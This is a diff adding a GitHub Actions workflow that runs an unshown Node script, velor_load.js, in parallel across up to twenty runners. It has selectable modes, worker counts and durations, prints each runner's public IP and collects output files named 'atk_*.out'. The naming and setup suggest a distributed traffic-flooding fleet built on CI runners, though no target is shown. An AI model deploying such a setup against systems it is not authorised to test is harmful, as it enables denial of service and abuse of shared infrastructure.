@@ -1,0 +1,51 @@
+name: load-test
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: test mode
+        type: choice
+        default: track500
+        options:
+          - track500
+          - track204
+          - static
+          - bundle
+          - mixed
+          - ws
+          - h2
+      workers:
+        description: parallel workers per runner
+        default: "8"
+      seconds:
+        description: test duration (seconds)
+        default: "240"
+      runners:
+        description: number of runners (1-20)
+        default: "20"
+jobs:
+  load:
+    if: ${{ matrix.i <= fromJSON(github.event.inputs.runners) }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    strategy:
+      fail-fast: false
+      matrix:
+        i: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+      - name: runner ip
+        run: curl -sS https://api.ipify.org && echo
+      - name: run test
+        env:
+          ATK_OUT: atk_${{ matrix.i }}.out
+        run: node velor_load.js "${{ github.event.inputs.mode }}" "${{ github.event.inputs.workers }}" "${{ github.event.inputs.seconds }}"
+      - name: upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: result-${{ matrix.i }}
+          path: atk_*.out
